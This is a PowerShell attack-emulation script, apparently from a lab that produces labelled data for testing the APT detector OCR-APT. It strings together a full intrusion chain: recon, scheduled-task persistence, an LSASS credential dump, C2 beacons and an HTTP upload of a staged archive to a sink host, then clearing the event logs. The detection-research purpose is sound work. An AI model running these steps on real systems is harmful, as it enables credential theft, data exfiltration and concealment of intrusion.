<#
  10 — APT STORY  (full kill chain)
  Composes the single techniques into ONE intrusion, in kill-chain order, with dwell time
  between phases. This is the "hardest" case and the one that matters most for OCR-APT:
  it produces a CONNECTED malicious subgraph spanning process, file, and network nodes —
  exactly the structure Alg. 1 reconstructs.

  Story:
    Initial foothold (discovery) -> establish persistence -> steal credentials ->
    call home (C2) -> collect & stage -> exfiltrate -> cover tracks.

  Run this DURING a benign test-split capture (ideally alongside the benign workload) so the
  attack subgraph is embedded in realistic noise. A pure-attack capture makes detection
  trivial and inflates metrics (see LABELING.md).

  Admin required: YES for the credential-access and log-clear phases. Run elevated.
#>
. "$PSScriptRoot\..\lib\attack-lib.ps1"
Initialize-AttackLab

$SinkHost = if ($env:C2_SINK_HOST) { $env:C2_SINK_HOST } else { "10.21.2.10" }
$SinkPort = if ($env:C2_SINK_PORT) { [int]$env:C2_SINK_PORT } else { 8888 }
$Dwell = 20   # seconds between phases — gives the graph temporal separation

function Phase($n) { Write-Host "`n==== APT PHASE: $n ====" -ForegroundColor Magenta; Start-Sleep -Seconds $Dwell }

Phase "1/7 Discovery"
Invoke-LabeledAtomic -Technique "T1082" -TestNumbers "1" -Tactic "discovery" `
    -ProcessIndicators @("systeminfo.exe") -Note "APT: recon"

Phase "2/7 Persistence"
Invoke-LabeledAtomic -Technique "T1053.005" -TestNumbers "1" -Tactic "persistence" `
    -ProcessIndicators @("schtasks.exe") -FileIndicators @("C:\Windows\System32\Tasks\*") `
    -Note "APT: scheduled-task persistence"

Phase "3/7 Credential Access"
Invoke-LabeledAtomic -Technique "T1003.001" -TestNumbers "1" -Tactic "credential-access" `
    -ProcessIndicators @("rundll32.exe") -FileIndicators @("*\lsass*.dmp") `
    -Note "APT: LSASS dump"

Phase "4/7 C2"
Invoke-LabeledStep -Technique "T1071.001" -Tactic "command-and-control" `
    -ProcessIndicators @("powershell.exe") -NetworkIndicators @("${SinkHost}:${SinkPort}") `
    -Note "APT: C2 beacons" -Action {
        for ($i = 0; $i -lt 5; $i++) {
            try { Invoke-WebRequest -Uri "http://$($SinkHost):$($SinkPort)/beacon?seq=$i" -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}
            Start-Sleep -Seconds 10
        }
    }

Phase "5/7 Collection & Staging"
$stageDir = "C:\Users\Public\stage"; $archive = "C:\Users\Public\exfil.zip"
Invoke-LabeledStep -Technique "T1560.001" -Tactic "collection" `
    -ProcessIndicators @("powershell.exe") -FileIndicators @("$stageDir\*", $archive) `
    -Note "APT: collect & archive" -Action {
        New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
        1..5 | ForEach-Object { "secret $_ $(Get-Random)" | Set-Content "$stageDir\secret_$_.txt" -Encoding utf8 }
        Get-ChildItem $stageDir -File | ForEach-Object { Get-Content $_.FullName | Out-Null }
        if (Test-Path $archive) { Remove-Item $archive -Force }
        Compress-Archive -Path "$stageDir\*" -DestinationPath $archive -Force
    }

Phase "6/7 Exfiltration"
Invoke-LabeledStep -Technique "T1041" -Tactic "exfiltration" `
    -ProcessIndicators @("powershell.exe") -FileIndicators @($archive) `
    -NetworkIndicators @("${SinkHost}:${SinkPort}") `
    -Note "APT: exfil archive" -Action {
        try { Invoke-WebRequest -Uri "http://$($SinkHost):$($SinkPort)/upload" -Method Post -InFile $archive -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}
    }

Phase "7/7 Defense Evasion"
Invoke-LabeledAtomic -Technique "T1070.001" -TestNumbers "1" -Tactic "defense-evasion" `
    -ProcessIndicators @("wevtutil.exe") -Note "APT: clear logs"

Write-Host "`n[APT] chain complete. Labels appended to $script:LabelFile" -ForegroundColor Green
